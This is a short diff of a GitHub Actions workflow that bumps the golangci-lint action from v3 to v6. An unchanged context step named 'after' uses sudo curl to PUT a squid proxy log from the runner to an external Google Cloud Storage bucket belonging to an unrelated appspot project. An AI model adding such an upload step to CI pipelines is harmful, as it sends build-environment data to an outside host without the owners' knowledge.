@@ -516,7 +516,7 @@ jobs:
         go-version: ${{ steps.go-version.outputs.golang_version }}
     - continue-on-error: true
       name: golangci-lint
-      uses: golangci/golangci-lint-action@v3
+      uses: golangci/golangci-lint-action@v6
     - name: after
       run: sudo curl --request PUT -T /squid/squidlog.json --url https://storage.googleapis.com/virtualeventdemoblr.appspot.com/squid/smartcontractkit/helmenv.$(date
         +%s)
